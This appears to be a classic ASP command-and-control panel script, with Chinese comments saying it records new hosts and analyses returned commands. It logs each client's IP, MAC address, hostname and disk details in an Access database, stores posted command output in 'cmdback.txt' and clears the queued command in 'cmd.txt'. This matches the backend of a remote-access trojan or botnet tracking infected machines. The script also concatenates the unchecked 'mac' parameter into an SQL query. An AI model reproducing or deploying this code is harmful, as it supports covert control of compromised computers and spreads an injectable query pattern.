<%
'+++++++++++++++++++++++++++++++++++++
'// 作用，记录新主机、分析返回的指令 //
'+++++++++++++++++++++++++++++++++++++
On error resume next
Dim conns,connstr,mdbs
'############  Access数据库连接字符串  ###########
    mdbs=Rpath&"host.mdb"           '数据库文件目录
    Connstr="DRIVER=Microsoft Access Driver (*.mdb);DBQ="+server.mappath(mdbs)
Set Conn=Server.CreateObject("ADODB.Connection") 
    conn.Open connstr
'------------------------------------------==
 If Err Then
    Err.Clear
    Set Conns = Nothing
    Response.Write "err!"
    Response.End
 End If
'=++++++++++++++++++++++++++++++++++++++++=
%>


<%
'/////////////////////////////////////////////////////////////////////
Function getIP() 
Dim strIPAddr 
    strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR") 
 If strIPAddr = "" Then strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    getIP=strIPAddr
End Function

'/////////////////////////////////////////////////////////////////////
Function Nows()
   Nows=year(now)&"_"&month(now)&"_"&day(now)&"_"&hour(now)&"_"&minute(now)&"_"&second(now)
end Function 

'/////////////////////////////////////////////////////////////////////
Function FSOFileRead(filename) 
  Dim objFSO,objCountFile,FiletempData 
  Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
  Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True)
  if not objCountFile.AtEndofStream then 
      FSOFileRead = objCountFile.Readall
  end if
  objCountFile.Close 
  Set objCountFile=Nothing 
  Set objFSO = Nothing 
End Function

'/////////////////////////////////////////////////////////////////////
Function SysSaveFile(Strbody,LocalFileName) 
        On error resume next
		LocalFileName=server.MapPath(LocalFileName)
Set Fso =CreateObject("scripting.filesystemobject")
    If (Fso.fileexists(LocalFileName)) Then
    Set f =Fso.opentextfile(LocalFileName,2,true)
        f.Write Strbody
        f.Close
        Else
    Set f=Fso.opentextfile(LocalFileName,2,true)
        f.Write Strbody
        f.Close
    End If 
End Function
%>





<%
dim hostfile,cmdfile,cmdbackfile,cmdStr,cmd
	cmdfile    ="cmd.txt"
	cmdbackfile="cmdback.txt"
	cmdStr     ="*"
	
   ip   = getIP()
   mac  = request("mac")
   host = request("host")
   cmd  = request("cmd")
   disk = request("disk")
   
if host="" then host="cami v1.2"
   cmd=replace(cmd,"{-}",chr(13))
   
if mac<>"" then

if cmd="host" then
 '---------------  记录主机  ---------------
   set rs=server.createobject("adodb.recordset")
       rs_sql="select * from host where mac='"&mac&"'"
       rs.open rs_sql,conn,1,3
	   if rs.eof then rs.addnew
	   if ip  <>"" then rs("ip")  =ip
	   if mac <>"" then rs("mac") =mac
	   if host<>"" then rs("host")=host
	   if disk<>"" then rs("disk")=disk
	   rs("update_time")  =now()
	   rs.update
	   rs.close
   set rs=nothing
elseif cmd<>"" then
 '---------------  接收返回信息  -------------
	  SysSaveFile mac&"{#}"&cmd,cmdbackfile    '返回信息
	  SysSaveFile "ok!",cmdfile                    '返回信息后，清除命令
end if

end if
%>